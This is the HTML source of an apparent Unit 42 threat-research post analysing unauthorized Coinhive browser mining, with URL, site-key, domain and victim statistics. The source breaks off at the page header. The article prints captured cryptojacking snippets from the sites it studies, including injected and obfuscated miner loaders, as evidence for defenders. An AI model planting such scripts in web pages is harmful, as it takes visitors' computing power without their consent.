
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Unauthorized Coin Mining in the Browser</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-unauthorized-coin-mining-browser/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-unauthorized-coin-mining-browser/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Unauthorized Coin Mining in the Browser" />
<meta property="og:description" content="Unit 42 examines the pervasiveness of unauthorized coin mining inside browsers." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-unauthorized-coin-mining-browser/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Bitcoin" />
<meta property="article:tag" content="Coinhive" />
<meta property="article:tag" content="Cryptocurrency" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-10-17T17:00:07+00:00" />
<meta property="article:modified_time" content="2018-11-05T09:22:05+00:00" />
<meta property="og:updated_time" content="2018-11-05T09:22:05+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 examines the pervasiveness of unauthorized coin mining inside browsers." />
<meta name="twitter:title" content="Unauthorized Coin Mining in the Browser" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Unauthorized Coin Mining in the Browser Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-unauthorized-coin-mining-browser/feed/" />
<meta property="og:likes" content="2"/>
<meta property="og:readtime" content="10"/>
<meta property="og:views" content="55,025"/>
<meta property="og:date_created" content="October 17, 2017 at 10:00 AM"/>
<meta property="og:post_length" content="2941"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Wei Xu"/>
<meta property="og:author" content="Yuchen Zhou"/>
<meta property="og:author" content="Wayne Xin"/>
<meta property="og:author" content="Jun Javier Wang"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/wei-xu/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/yuchen-zhou/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/wayne-xin/"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/jun-j-wang/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Unauthorized Coin Mining in the Browser","name":"Unauthorized Coin Mining in the Browser","description":"Unit 42 examines the pervasiveness of unauthorized coin mining inside browsers.\r\n","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-unauthorized-coin-mining-browser\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-unauthorized-coin-mining-browser\/","datePublished":"October 17, 2017","articleBody":"Cryptocurrencies have taken the world by storm. From the biggest player Bitcoin to newcomers such as Monero and Ethereum, cryptocurrency mining has become a hot industry due in part to powerful, dedicated mining hardware or by utilizing graphics cards\u2019 parallel computing power. Recently, browser coin mining has taken off, for a lot of different reasons. Although the computing power per instance is much less than dedicated hardware provides, being able to utilize many users on various sites more than make up for it. There is \u00a0already some media coverage on this, such as\u00a0BBC, and\u00a0malwarebytes. While we do not consider crypto-currency mining inside browsers malicious by itself, often such mining is going on without the end user\u2019s consent or even knowledge that makes this practice shady and despicable.\r\n\r\nCoinhive, one of the more popular browser-mining services out there offers site owners a piece of JavaScript for easy integration. Site owners use site visitors\u2019 CPU time to mine XMRs (Moneros) for Coinhive, and Coinhive pays out 70% of mined value to site owners. A new player,\u00a0crypto-loot\u00a0\u00a0emerged recently which offers similar services but pays out 88% of revenue.\r\n\r\nCoinhive Integration\r\nOn the official Coinhive homepage, we found detailed documentation on how to integrate the mining scripts onto any given website. Owners can use the easy version:\r\n\r\nvar miner = new CoinHive.Anonymous('YOUR_SITE_KEY');\r\nminer.start();\r\n\r\nor more complicated version that gives control over how the end user's CPU time should be used, e.g. how many threads, should the mining throttle.\r\nvar miner = new CoinHive.User('YOUR_SITE_KEY', 'john-doe', {\r\n    threads: 4,\r\n    autoThreads: false,\r\n    throttle: 0.8,\r\n    forceASMJS: false\r\n});\r\n\r\nHigher thread number and\/or lower throttle number will result in more CPU usage in client's browser. With higher CPU occupation percentage, end users will likely experience sluggish behavior and poor experience on the websites.\r\n\r\nTracking Coinhive Integrations\r\nWe have been tracking the inclusion of Coinhive mining script (coinhive.min.js) for a week in our PANDB unknown feed. The number of URLs leading to the download of such similar scripts is astounding. Since we started tracking, we have seen anywhere from 6K unique URLs to over 10K in one single day.\r\n\r\nOverall, we have seen over 35,119 unique URLs associated with coinhive.min.js. Across these URLs, there are a total of 144 IPs and 1,025 hostnames. Based on our observation, the appearance of these scripts can be clearly divided into three categories \u2013 standalone, voluntary, and compromised.\r\n\r\nStandalone Hosting\r\nURLs like this one,\r\nhxxp:\/\/gkiqfnjtwmj[.]bid\/vhyk.php%3fr=1507428652%26v=3%26ilznfamx=1322781%26zptrfkmy=%26djpsicdr=%26adymouss=%26ruxhztvq=http:\/\/cricfree[.]cc\/stream2watch\/bt2.php%26s=1536%2c864%2c1.83%2c2810.88%2c1581.1200000000001\r\nalways hosts the following content:\r\n\r\n&lt;html&gt;\r\n    &lt;body&gt;\r\n        &lt;script&gt;\r\n            var mnr = document.createElement('script');\r\n            mnr.src = 'https:\/\/coin-hive[.]com\/lib\/coinhive.min.js';\r\n            mnr.onload=function(){\r\n                var miner=CoinHive.Anonymous('T3z562MP2Zg1lIa7RUJy19d67woeZmJJ');\r\n                miner.start();\r\n            };\r\n            document.getElementsByTagName('body')[0].appendChild(mnr);\r\n        &lt;\/script&gt;\r\n    &lt;\/body&gt;\r\n&lt;\/html&gt;\r\nIt is worth noting that such URLs are always belong to a jibberish[.]bid domain, with a long trailing set of parameters. Of the 35,119 URLs we collected, 33,188, or 94.5% are of this category. In addition, there are 612 URLs leading to the same set of .bid domains, but with much shorter URLs, like hxxp:\/\/www.pudptxanhspld[.]bid\/static\/robots.txt, or even the domain itself: hxxp:\/\/www.pudptxanhspld[.]bid\/.\r\n\r\nThe fact that robots.txt is hosting the exact same content as any other longer URLs with seemingly random parameters leads us to speculate that the domain will serve the same coin-mining content to all visitors, ignoring the request parameters or paths. It is interesting to speculate: why did our customer visit such weird, long, random URLs in the first place?\r\n\r\nWe give some of our speculations later in this blog.\r\n\r\nAfter removing the .bid domains, we are left with 1,342 URLs, or 3.8% of the corpus. The remaining can be further categorized into the following three groups:\r\n\r\nVoluntary: Crypto-mining related sites\r\nWe found multiple URLs related to coin\/crypto\/mining keywords. Some of these are forums discussing crypto-mining, while others are introducing the concept. Regardless of the purpose of the websites, we did not find any evidence that such sites are asking user's consent to mine XMRs.\r\n\r\n\r\nVoluntary: Monetization\r\nThis category includes sites that obviously want to include coin-mining scripts to monetize. Examples of these include video\/porn sites such as\r\nxmoviesforyou[.]com\r\n www.webze[.]tv\r\nWhile they do provide their normal service to the visitors, browsing these sites do not pop up any sort of warning of coin-mining behavior for the user. A script snippet embedded in such sites can be found here:\r\n\r\n&lt;div style='padding-bottom:1px;'&gt;&lt;center&gt;&lt;iframe src=\"\/\/ads.exoclick.com\/iframe.php?idzone=1978420&amp;size=728x90\" width=\"728\" height=\"90\" scrolling=\"no\" marginwidth=\"0\" marginheight=\"0\" frameborder=\"0\"&gt;&lt;\/iframe&gt;&lt;\/center&gt;&lt;\/div&gt;&lt;link rel='stylesheet' id='yarppRelatedCss-group-css' href='http:\/\/www.xmoviesforyou.com\/wp-content\/plugins\/bwp-minify\/min\/?f=wp-content\/plugins\/yet-another-related-posts-plugin\/style\/related.css' type='text\/css' media='all' \/&gt;\r\n&lt;script type='text\/javascript' src='http:\/\/www.xmoviesforyou.com\/wp-content\/plugins\/bwp-minify\/min\/?f=wp-includes\/js\/wp-embed.min.js'&gt;&lt;\/script&gt;\r\n&lt;script type=\"text\/javascript\"&gt;\r\nvar __htapop = {};\r\nvar ue84gwapead = \"\\\/\\\/cpaofferstat.com\\\/p?zoneId=2053591-2053649\";\r\n(function() {\r\n    var s = document.createElement('script');\r\n    var x = document.getElementsByTagName('script')[0];\r\n    s.src   = ue84gwapead;\r\n    s.type  = 'text\/javascript';\r\n    s.async = true;\r\n    x.parentNode.insertBefore(s, x);\r\n})();\r\n&lt;\/script&gt;\r\n&lt;script src=\"https:\/\/coinhive.com\/lib\/coinhive.min.js\"&gt;&lt;\/script&gt;\r\n&lt;script&gt;\r\n        var miner = new CoinHive.Anonymous('Y6SEjQDJ0cLYs8qGClt74lChPIf5EGDt', {threads: 4, throttle: 0.8});\r\n        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);\r\n&lt;\/script&gt;\r\n&lt;\/body&gt;\r\n&lt;\/html&gt;\r\n\r\nWhat is more interesting is that by searching across the whole URL corpus for\u00a0coinhive.min.js\u00a0downloads, we found URLs such as the below\r\n\r\nhxxp:\/\/avditmiohvtq[.]bid\/y.htm%3fr=1507583452%26v=3%26jfbakqer=2246476%26ipgznbkx=%26bwxtoxtb=%26oghaenqv=%26hsvxkzhp=http:\/\/www.xmoviesforyou[.]com\/2017\/10\/momsincontrol-rebecca-rhiannon-ryder-pussy-is-international.html%26s=1280%2c800%2c2%2c2560%2c1600\r\n\r\nwhich includes\u00a0xmoviesforyou[.]com\u00a0as part of the URL almost like a referrer parameter. We verified that the below is indeed a valid URL leading to a subpage in the porn site.\r\n\r\nhxxp:\/\/www.xmoviesforyou[.]com\/2017\/10\/momsincontrol-rebecca-rhiannon-ryder-pussy-is-international.html\r\n\r\nThat site does include\u00a0coinhive.min.js, but at the time of our verification prior to publishing, the inclusion is directly from\u00a0https:\/\/coinhive[.]com\/lib\/coinhive.min[.]js and the whole page does not include any references to a suspicious .bid domain\/URL. We speculate that the porn website URL may have included an iframe leading to the .bid domain, which then triggers the download of coinhive.min.js. However, this mechanism may have been later abandoned in favor of direct inclusion.\r\n\r\n&nbsp;\r\nCompromised\/Injected Integration\r\nAnother group of sites seem to have fallen victims of malicious script injection into their vulnerable servers. We found that www.livetruemoney[.]com uses up 100% of user's CPU time. Upon closer investigation, we found that this site is hosting multiple copies of coinhive.min.js, toward the top and bottom of the page. A similar situation happens in www.comptesofficiels[.]com\/, where the snippet is injected outside of &lt;body&gt; tag (a common symptom for injected content), as follows:\r\n&lt;script src=\"https:\/\/pingendo[.]com\/assets\/bootstrap\/bootstrap-4.0.0-alpha.6.min.js\"&gt;&lt;\/script&gt;\r\n&lt;\/body&gt;\r\n&lt;script&gt;\r\n    var miner = new CoinHive.Anonymous('i9uQcOE9w92MvsV8JJjb7riFlJXg8Gwh', {throttle: 0.5});\r\n    miner.start();\r\n  &lt;\/script&gt;\r\n&lt;\/html&gt;\r\nIt is quite possible that crypto-mining has become a new injection\u00a0attack in addition to traditional exploit kits redirections.\r\n\r\nFinally, we have also seen some typo-squatting\/phishing domains serving coinhive.min.js. Examples include analytics-google[.]net\/track.php, and www-bank[.]ru.\r\n\r\nActor\/Mining Configuration Analysis\r\nAccording to our observation, coin mining integration scripts are rarely obfuscated, which means we can extract the anonymous 'site key' and their configurations easily. Per Coinhive's documentation, the 'site key' is a unique identifier to indicate which beneficiary will be paid, therefore, the attacker has no incentive to garble this field. Here are some interesting stats about the actors and their configurations.\r\n\r\nActor distribution\r\n\r\n\r\nThere is a clear winner at the top - ID t3z562mp2zg1lia7rujy19d67woezmjj claiming 35,742 over 36,842 of all the IDs we were able to retrieve. Surprisingly, querying a website source code search engine like publicWWW only returns 13 results (mostly .bid domains).\u00a0The remote second and third sites scored 370 and 119 occurrences respectively, along with 8 other IDs topping 10 occurrences. A large number (146) of IDs only have 1 appearance in our dataset, and these are possibly category 2 or 3 in our integration scenarios described above \u2013 mining would benefit themselves rather than a campaign owner.\r\n\r\nUnsurprisingly, site key owner t3z562mp2zg1lia7rujy19d67woezmjj has all the .bid URLs pointing to this payee. In addition, there are URLs such as\r\n\r\nhttp:\/\/216.21.13[.]11\/s%3fcid=5100604%26iuid=1619927385%26ts=1507160862%26ps=3429657830%26pw=2413%26\r\n\r\nalso using the same site key. Passive DNS analysis reveals that this IP actually was mapped to serve.popads[.]net, so it is interesting that this particular advertising network may have led to crypto-mining behavior.\r\n\r\nIn this chart, a special case\u00a0sitekey\u00a0stands out. There are 151 sites using it, and it is a predefined variable in previous scripts (as opposed to hardcoded string) so without dynamic analysis we are not able to retrieve its real content. We looked at a few samples and it seems that most sites using the sitekey variable are serving mining script to benefit themselves.\r\n\r\nWe found only six out of the entire URL population making more than one call to coinhive.Anonymous function (which means they could possibly be compromised by two different adversaries\/serving two different payees at the same time). Upon closer inspection, all the calls actually have the same site key, so in summary we did not find evidence of one site serving more than one beneficiary. We did, however, find out that one site, lottoipros[.]com, is attempting to obfuscate its site key by using simple Unicode encoding:\r\nvar _0x8cfd=[\"\\x56\\x63\\x33\\x38\\x75\\x32\\x33\\x35\\x51\\x67\\x31\\x55\\x6E\\x48\\x78\\x47\\x43\\x52\\x6A\\x59\\x51\\x4D\\x58\\x70\\x6E\\x4A\\x73\\x58\\x77\\x4B\\x4C\\x69\",\"\\x73\\x74\\x61\\x72\\x74\"];var miner=new CoinHive.Anonymous(_0x8cfd[0],{threads:1,autoThreads:true,throttle:0.6,forceASMJS:false})\r\nClearly, the site owner\/injector is aware of the risks of exposing its key and is trying to hide from public scrutiny. If this trend continues, it will become harder to use static analysis to detect crypto-mining sites.\r\n\r\nConfiguration Distribution\r\nThe dominant Actor ID t3z562mp2zg1lia7rujy19d67woezmjj uses default configuration across all of observed URLs, so we exclude this actor from this analysis to prevent skew. We also exclude the 142 sites that use mineropts that go almost hand-in-hand with sites using sitekey as their site key.\r\n\r\nThis left us with 827 valid data points. Among these most sites only use 1 thread by default; however, some sites use as many as 4 threads to maximize mining speed.\r\n\r\n\r\n\r\nThread count\r\nNumber of sites\r\n\r\n\r\ndefault (1)\r\n772\r\n\r\n\r\n1\r\n28\r\n\r\n\r\n2\r\n7\r\n\r\n\r\n3\r\n1\r\n\r\n\r\n4\r\n19\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nAfter the default setting which disables throttling the most popular option is to set it at 0.5, so that the CPU would idle 50% of the time. It is sufficient to say that most sites are not giving user\u2019s CPU any break at all by disabling throttling.\r\n\r\n\r\n\r\nThrottle setting\r\nNumber of sites\r\n\r\n\r\ndefault (0)\r\n772\r\n\r\n\r\n0.5\r\n28\r\n\r\n\r\n0.2\r\n25\r\n\r\n\r\n0.7\r\n19\r\n\r\n\r\n0.9\r\n10\r\n\r\n\r\nother values combined\r\n35\r\n\r\n\r\n\r\n\r\nHosting domain analysis\r\nIn this section, we show some hosting domain stats, including PassiveDNS and Whois data analysis.\r\n\r\nThe TLD distribution for domains hosting coinhive.min.js is shown below. For brevity, we aggregated all TLDs having less than 20 entries into others category.\r\n\r\n\r\n\r\nClearly, the top suspects are .download and .bid domains, taking more than 35% of the total share of 1,025 domains. As expected, typically notorious TLDs like .xyz and .win is also listed.\r\n\r\nAlexa rank distribution\r\nWe checked all associated domains against the current Alexa traffic ranking. The results are astonishing - there are 5 sites in top 2K, 29 sites in top 10K and 155 sites in top 1 million. We sample a few highest-ranking sites and show it here:\r\n\r\n\r\n\r\n\r\nSite\r\nAlexa Rank\r\n\r\n\r\nuptobox[.]com\r\n771\r\n\r\n\r\n123movies[.]co\r\n963\r\n\r\n\r\ncinecalidad[.]to\r\n1026\r\n\r\n\r\nwatchfree[.]to\r\n1892\r\n\r\n\r\nsugklonistiko[.]gr\r\n1910\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nAt the time of the writing, we can no longer observe coinhive.min.js on their sites.\r\n\r\nThe highest ranked .bid domain, llxyyocfgfg[.]bid is ranked at 3380 at the time of this writing. We have attached all these IOCs and their rankings at the end of this blog for the community's benefits.\r\n\r\npDNS analysis\r\nWe looked up these domains in our passive DNS (pDNS) database. 794 domains were found with records among the 1026 domains in total. We found that the first DNS query to many domains dates back to the launch date of our pDNS in 2013. Examples include\u00a0uptobox[.]com, torrent[.]cd, and tiexue[.]net. This means these websites have been active for a long time. Some of them are quite popular based on their Alexa ranking. So, the potential impact of Coinhive can be high in both time and space. We also found that the first DNS query to 502 (63%) domains happened in October 2017. Based on the figure below, we can clearly see the emerging trend of these domains.\r\n\r\n\r\n\r\nWe further investigated the DNS query pattern of these domains. In particular, the following graph shows the number of DNS queries to these website per hour. Interestingly, we found that some domains exhibit very similar patterns. Although the start time and amount of traffic are slightly different, the overall pattern of traffic is very much similar in shape. This is another indicator that these domains potentially belong to the same campaign launched by the same owner.\r\n\r\n\r\n\r\nIn addition, we analyzed the distribution of IPs to which these domains were resolved. We identified 1,172 IPs in total, located in 47 different countries with the majority being in US. Below is the figure showing the country-level distribution of these IPs.\r\n\r\n\r\n\r\nWhois analysis\r\nThrough querying public Whois server as well as Domaintools, we obtained 861 valid whois records of 1,025 domains. Below we break the results down by registrant\/emails and their registration dates.\r\n\r\n \tRegistrant\/Emails: Not much can be learned due to the fact that most (521) are privacy protected by WhoisGuard. In the remaining registrants, there are also fake ones such as Administrator and Private Person. After removing the useless entries, we are only left with 80 different registrants, with no more than one registrant appearing more than 3 times. All the .bid domains are privacy protected. Since WhoisGuard service is not free (around $3\/year), the .bid campaign actors are probably earning enough profit to offset this cost.\r\n \tRegistration date: To better present details in registration date, we separate domains with different TLDs:\r\n\r\n\r\n\r\nFor .bid domains that we\u00a0were able to retrieve whois information, most are registered after 10\/01\/2017 but spanning across multiple days, showing that the campaign is very recent and it has a rotating number of domains refreshing every day.\r\n\r\n\r\n\r\nIn contrast, most .download\u00a0domains were registered within 3 days of 09\/14-09\/16, 2017, with only a handful added on later. This looks to be a different campaign than the .bid\u00a0ones. We see similar registration trending on .review\u00a0domains (87 out of 103 are registered on the 3rd, 7th, and 8th of October 2017).\r\n\r\n\r\n\r\nFinally, after we exclude the suspected campaign domains (.bid, .download, .review, .top, .win), the registration dates are extremely spread out from as early as 2001 to the current date. These domains are most likely either embracing the new crypto-mining monetization fever, or compromised by attackers to take advantage of their established reputation and high-volume visitors.\r\n\r\nVictim analysis\r\nThe URLs we crawled to detect crypto-miner presence comes from our PANDB cloud log. In this section, we analyze the demographics of visitors to such sites to shed some insights on their real-world impact.\r\n\r\nThis figure shows the general geographic distribution of visitors to crypto-mining sites. While the US clearly dominates in total visiting counts, Europe and Asia Pacific is not too far behind. This graph indicates a broad spectrum of victims all across the globe.\r\n\r\nAfter breaking down visits site-by-site, we found that the most visited sites generally align with their Alexa ranking, with over 40K visits* to the 123moviews[.]co:\r\n\r\n\r\n\r\nWe only log a query when customer(s) using the same device visits the site for the first time in a TTL window. This does not count duplicate visits to the same site within a short timeframe. Therefore, the visits estimations are a lower bound.\r\n\r\nSummary\r\nAs AdGuard has pointed out, the use of coinhive or similar mining services is itself not a malicious activity, it is how they are used that makes the sites malicious. Unfortunately, for the sites that we were able to observe engaging in crypto-mining activities, none of them has prompted the user with any sort of warning, let alone providing the kill switch for mining. With Bitcoin soaring over $5K (at time of writing), we can only expect more of such services spawning from everywhere. To protect yourself from this fast-growing threat, we recommend two options:\r\n\r\n \tPalo Alto Networks is blocking URLs hosting the Coinhive JavaScript files through PANDB, which can be enforced as part of the malware category, as these scripts are consuming system resources without the users\u2019 knowledge or consent.\r\n \tIn addition, popular browser plugins such as Adblock plus or Adguard will also block such mining scripts. Combine it with our firewall solution, you can rest assured that your previous CPU time and electricity is not exploited by sneaky scripts.\r\n \tUsers interested in\u00a0top-ranked .bid, .download, and .website Domains hosting Coinhive script files included in this analysis can access them here.\r\n","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Wei Xu"},{"@type":"Person","name":"Yuchen Zhou"},{"@type":"Person","name":"Wayne Xin"},{"@type":"Person","name":"Jun Javier Wang"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"46044","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=46044' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-unauthorized-coin-mining-browser%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-unauthorized-coin-mining-browser%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-46044 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
